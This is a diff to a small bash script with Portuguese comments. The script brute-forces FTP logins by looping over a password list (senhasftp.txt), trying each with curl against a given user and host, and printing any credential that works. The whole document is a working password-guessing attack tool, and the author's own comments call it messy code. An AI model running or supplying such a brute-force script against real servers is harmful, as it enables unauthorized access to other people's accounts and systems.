@@ -5,15 +5,20 @@
 #dia 25 de maio ás 23:17
 
 
+#dia 28 de junho
+#Ajustes etc
+
+#Código podre, mas funciona
+#O curl nao gosta de mim
+
 
 while read senhas;do
-  value="$(curl -s -o /dev/null -w "%{http_code}" -u $1:$senhas ftp://$2:21)"
-if [ "$value" == "226" ];then
-  echo "Encontrado credencial: username: $username password: $senhas"
-  curl -s -u $1:$senhas ftp://$2:21
-  exit
+  $(curl -su $1:$senhas ftp://$2:21)
+if [ $(curl -su $1:$senhas ftp://$2:21) ];then
+  echo "Encontrado credencial: username: $1 password: $senhas"
 else
   echo "Nenhuma credencial com sucesso"
-  exit
 fi
 done < senhasftp.txt
+
+#230 (código de logado com sucesso!)
